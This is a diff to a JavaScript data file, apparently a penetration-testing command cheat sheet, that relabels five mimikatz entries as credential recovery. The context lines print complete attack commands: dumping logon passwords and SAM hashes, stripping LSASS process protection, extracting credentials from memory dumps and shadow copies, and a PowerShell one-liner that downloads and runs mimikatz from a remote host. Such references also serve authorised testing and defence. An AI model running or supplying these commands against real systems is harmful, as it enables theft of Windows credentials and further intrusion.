@@ -191,21 +191,21 @@ var data = [
     {
         "id": 28,
         "tool": "mimikatz",
-        "category": "POST-EXPLOITATION",
+        "category": "POST-EXPLOITATION/CREDS_RECOVER",
         "information": "mimikatz one liner",
         "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\""
     },
     {
         "id": 29,
         "tool": "mimikatz",
-        "category": "POST-EXPLOITATION",
+        "category": "POST-EXPLOITATION/CREDS_RECOVER",
         "information": "load mimikatz in memory",
         "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://[ip]/mimikatz.ps1')\""
     },
     {
         "id": 30,
         "tool": "mimikatz",
-        "category": "POST-EXPLOITATION",
+        "category": "POST-EXPLOITATION/CREDS_RECOVER",
         "information": "mimikatz disable ppl and dump password",
         "command": "mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\""
     },
@@ -213,14 +213,14 @@ var data = [
     {
         "id": 31,
         "tool": "mimikatz",
-        "category": "POST-EXPLOITATION",
+        "category": "POST-EXPLOITATION/CREDS_RECOVER",
         "information": "mimikatz extract credentials from dump",
         "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\""
     },
     {
         "id": 32,
         "tool": "mimikatz",
-        "category": "POST-EXPLOITATION",
+        "category": "POST-EXPLOITATION/CREDS_RECOVER",
         "information": "mimikatz extract credentials from shadow copy (1)",
         "command": "mimikatz.exe \"lsadump::sam /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY /sam:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\""
     }
